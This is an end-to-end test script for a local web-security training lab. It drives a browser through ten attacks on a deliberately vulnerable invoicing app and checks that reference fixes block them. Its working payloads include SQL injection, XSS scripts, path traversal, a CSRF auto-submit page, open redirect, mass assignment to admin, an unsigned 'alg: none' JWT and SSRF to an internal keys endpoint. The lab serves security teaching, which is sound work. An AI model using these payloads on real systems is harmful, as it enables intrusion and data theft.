// Solves the lab in a real browser, the way a learner would, and saves screenshots to e2e/out/.
//
//   python -m breachlab --no-reload &          then   node e2e/solve.cjs
//   python -m breachlab --fixed --no-reload &  then   MODE=fixed node e2e/solve.cjs
//
// Default mode proves every exploit works and its flag is captured. MODE=fixed proves the
// same attacks fail on the reference fixes and that "Check my fix" accepts all ten.
// This wipes the lab's progress first. The CSRF step serves an attacker page on ATTACKER_PORT.

const assert = require("node:assert/strict");
const fs = require("node:fs");
const http = require("node:http");
const path = require("node:path");
const { chromium } = require("playwright");

const BASE = (process.env.BREACHLAB_URL || "http://127.0.0.1:4160").replace(/\/$/, "");
const ATTACKER_PORT = Number(process.env.ATTACKER_PORT || 4161);
const ATTACKER = `http://${new URL(BASE).hostname}:${ATTACKER_PORT}`;
const FIXED = process.env.MODE === "fixed";
const OUT = path.join(__dirname, "out");
const IDS = ["sqli", "reflected_xss", "stored_xss", "idor", "path_traversal", "open_redirect", "mass_assignment", "csrf", "weak_jwt", "ssrf"];

const b64 = (value) => Buffer.from(JSON.stringify(value)).toString("base64url");

async function main() {
  fs.mkdirSync(OUT, { recursive: true });
  const browser = await chromium.launch();
  const context = await browser.newContext({ viewport: { width: 1200, height: 800 } });
  const page = await context.newPage();
  const dialogs = [];
  page.on("dialog", (dialog) => {
    dialogs.push(dialog.message());
    dialog.accept();
  });
  const shot = (name, options = {}) => page.screenshot({ path: path.join(OUT, `${FIXED ? "fixed-" : ""}${name}.png`), ...options });
  const flags = async () => Number((await page.locator(".labbar-count").innerText()).split(" ")[0]);
  const body = () => page.locator("body").innerText();
  let expected = 0;
  // After each attack: in vulnerable mode exactly one more flag, in fixed mode none.
  const settle = async (name) => {
    if (!FIXED) expected += 1;
    await page.goto(`${BASE}/lab`);
    assert.equal(await flags(), expected, `flag count after ${name}`);
    console.log(`${FIXED ? "blocked " : "captured"}  ${name}`);
  };

  // The attacker's website: another origin on the same host, serving an auto-submitting form.
  const attacker = http.createServer((request, response) => {
    response.setHeader("Content-Type", "text/html");
    if (request.url !== "/") return response.end("This is not Quillbook any more.");
    response.end(`<body onload="document.forms[0].submit()"><form method="post" action="${BASE}/account">
      <input name="display_name" value="Alice Moreau"><input name="email" value="attacker@evil.test"></form>`);
  });
  await new Promise((resolve) => attacker.listen(ATTACKER_PORT, "127.0.0.1", resolve));

  // Start from a clean lab.
  await page.goto(`${BASE}/lab`);
  await page.getByRole("button", { name: "Reset data and progress" }).click();
  await page.waitForURL(/reset=1/);
  assert.equal(await flags(), 0);
  await shot("01-challenges");

  const login = async (url = `${BASE}/login`) => {
    await page.goto(url);
    await page.getByLabel("Username").fill("alice");
    await page.getByLabel("Password").fill("alice-demo");
    await page.getByRole("button", { name: "Sign in" }).click();
  };
  await login();
  await page.waitForURL(`${BASE}/invoices`);

  // 1. SQL injection through the search box.
  await page.getByLabel("Search your invoices by customer").fill("' OR 1=1--");
  await page.getByRole("button", { name: "Search" }).click();
  assert.equal((await body()).includes("Harbor Freight Lines"), !FIXED);
  await shot("02-sqli");
  await settle("sqli");

  // 2. Reflected XSS: script from the URL runs and calls alert().
  await page.goto(`${BASE}/help?q=${encodeURIComponent("<script>alert('reflected')</script>")}`);
  if (!FIXED) await page.locator(".flagbanner", { hasText: "Reflected XSS" }).waitFor();
  assert.equal(dialogs.includes("reflected"), !FIXED);
  await shot("03-reflected-xss");
  await settle("reflected_xss");

  // 3. Stored XSS: a note that runs script for every reader of the board.
  await page.goto(`${BASE}/notes`);
  await page.getByLabel(/New note/).fill("<script>alert('stored')</script>");
  await page.getByRole("button", { name: "Post note" }).click();
  if (!FIXED) await page.locator(".flagbanner", { hasText: "Stored XSS" }).waitFor();
  else await page.getByText("<script>alert('stored')</script>").waitFor();
  assert.equal(dialogs.includes("stored"), !FIXED);
  await shot("04-stored-xss");
  await settle("stored_xss");

  // 4. IDOR: open Bob's invoice by number.
  const idor = await page.goto(`${BASE}/invoices/2001`);
  assert.equal(idor.status(), FIXED ? 404 : 200);
  assert.equal((await body()).includes("Confidential"), !FIXED);
  await shot("05-idor");
  await settle("idor");

  // 5. Path traversal out of the exports folder.
  await page.goto(`${BASE}/exports/download?file=../private/payroll-2026.txt`);
  assert.equal((await body()).includes("Payroll 2026"), !FIXED);
  await settle("path_traversal");

  // 6. Open redirect: a login link that ends on another site (the attacker's page on another port).
  await page.goto(`${BASE}/invoices`);
  await page.getByRole("button", { name: "Sign out" }).click();
  await login(`${BASE}/login?next=${ATTACKER}/phish`);
  await page.waitForURL(FIXED ? `${BASE}/invoices` : `${ATTACKER}/phish`);
  await settle("open_redirect");

  // 7. Mass assignment: add a field the form never offered.
  await page.goto(`${BASE}/account`);
  await page.evaluate(() => {
    const extra = Object.assign(document.createElement("input"), { type: "hidden", name: "role", value: "admin" });
    document.querySelector("#profile").append(extra);
  });
  await page.getByRole("button", { name: "Save changes" }).click();
  await page.waitForURL(/saved=1/);
  const admin = await page.goto(`${BASE}/admin`);
  assert.equal(admin.status(), FIXED ? 403 : 200);
  await shot("06-mass-assignment");
  await settle("mass_assignment");

  // 8. CSRF: an auto-submitting form on another origin (same host, different port).
  await page.goto(`${ATTACKER}/`);
  await page.waitForURL(`${BASE}/account*`);
  await page.goto(`${BASE}/account`);
  assert.equal(await page.getByLabel("Email").inputValue(), FIXED ? "alice@quillbook.test" : "attacker@evil.test");
  await settle("csrf");

  // 9. Forged JWT: an unsigned token that claims to be admin.
  const forged = `${b64({ alg: "none", typ: "JWT" })}.${b64({ sub: "alice", role: "admin" })}.`;
  const report = await context.request.get(`${BASE}/api/admin/report`, { headers: { Authorization: `Bearer ${forged}` } });
  assert.equal(report.status(), FIXED ? 401 : 200);
  await settle("weak_jwt");

  // 10. SSRF: make the server fetch its own internal endpoint.
  const direct = await context.request.get(`${BASE}/internal/keys`);
  assert.equal(direct.status(), 403, "the internal endpoint must refuse the browser");
  await page.goto(`${BASE}/invoices/import`);
  await page.getByLabel("Supplier invoice URL").fill(`${BASE}/internal/keys`);
  await page.getByRole("button", { name: "Fetch preview" }).click();
  assert.equal((await body()).includes("qb-billing-live"), !FIXED);
  await shot("07-ssrf");
  await settle("ssrf");

  assert.equal(await flags(), FIXED ? 0 : 10);
  await shot("08-progress", { fullPage: true });

  // Stage 2: "Check my fix" runs the same check as the provided test.
  for (const id of IDS) {
    await page.goto(`${BASE}/lab/c/${id}`);
    await page.getByRole("button", { name: "Check my fix" }).click();
    await page.locator(".report").waitFor();
    assert.equal(await page.locator(".report-ok").count(), FIXED ? 1 : 0, `fix check for ${id}`);
  }
  await page.goto(`${BASE}/lab/c/sqli`);
  await page.locator("details").first().click();
  await shot("09-challenge", { fullPage: true });
  await page.goto(`${BASE}/lab`);
  assert.equal(await page.locator(".stamp-fixed").count(), FIXED ? 10 : 0);
  await shot("10-progress-after-checks", { fullPage: true });

  // A phone-sized look at the two main lab pages.
  await page.setViewportSize({ width: 390, height: 844 });
  await shot("11-mobile-challenges", { fullPage: true });
  await page.goto(`${BASE}/lab/c/csrf`);
  await shot("12-mobile-challenge", { fullPage: true });

  await browser.close();
  attacker.close();
  console.log(FIXED ? "All ten attacks are blocked and all ten fixes verified." : "All ten flags captured.");
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
